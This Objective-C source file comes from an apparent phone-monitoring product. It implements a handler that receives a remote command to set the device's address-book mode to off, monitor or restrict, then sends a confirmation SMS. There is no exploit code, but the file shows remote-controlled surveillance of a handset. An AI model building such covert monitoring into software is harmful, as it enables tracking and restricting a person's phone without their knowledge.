/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetAddressBookManagementProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SetAddressBookManagementProcessor.h"
#import "Preference.h"
#import "PrefRestriction.h"

@interface SetAddressBookManagementProcessor (PrivateAPI)
- (void) processSetAddressBookManagement;
- (void) setAddressBookManagementException;
- (void) sendReplySMS;
- (BOOL) isValidArgs;
@end

@implementation SetAddressBookManagementProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetAddressBookManagementProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (SetAddressBookManagementProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"SetAddressBookManagementProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetAddressBookManagementProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SetAddressBookManagementProcessor--->doProcessingCommand")
	if ([self isValidArgs]) {
		[self processSetAddressBookManagement];	
	}
	else {
		[self setAddressBookManagementException];
	}
}

#pragma mark SetAddressBookManagementProcessor PrivateAPI Methods

/**
 - Method name: processSetAddressBookManagement
 - Purpose:This method is used to process SetAddressBookManagement
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processSetAddressBookManagement {
	DLog (@"SetAddressBookManagementProcessor--->processClearEmergencyNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefRestriction *prefRestriction = (PrefRestriction *)[prefManager preference:kRestriction];
	switch ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]) {
		case 0:
			[prefRestriction setMAddressBookMgtMode:kAddressMgtModeOff];
		break;
		case 1:
			[prefRestriction setMAddressBookMgtMode:kAddressMgtModeMonitor];
		break;
		case 2:
			[prefRestriction setMAddressBookMgtMode:kAddressMgtModeRestrict];
		break;
	}
	[prefManager savePreferenceAndNotifyChange:prefRestriction];
	[self sendReplySMS];
}

/**
 - Method name: processSetAddressBookManagement
 - Purpose:This method is used to process isValidArgs
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) isValidArgs {
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) {
		NSString *argString=[args objectAtIndex:2];
		  if (([argString isEqualToString:@"0"]) || ([argString isEqualToString:@"1"]) || ([argString isEqualToString:@"2"]))
			  isValid=YES;
	}
	return isValid;
}

/**
 - Method name: setAddressBookManagementException
 - Purpose:This method is invoked when setAddressBookManagement process failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) setAddressBookManagementException {
	DLog (@"RequestAddressBookProcessor--->setAddressBookManagementException")
	FxException* exception = [FxException exceptionWithName:@"setAddressBookManagementException" andReason:@"Set AddressBook error"];
	[exception setErrorCode:kAddressBookManagerBusy];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"SetAddressBookManagementProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
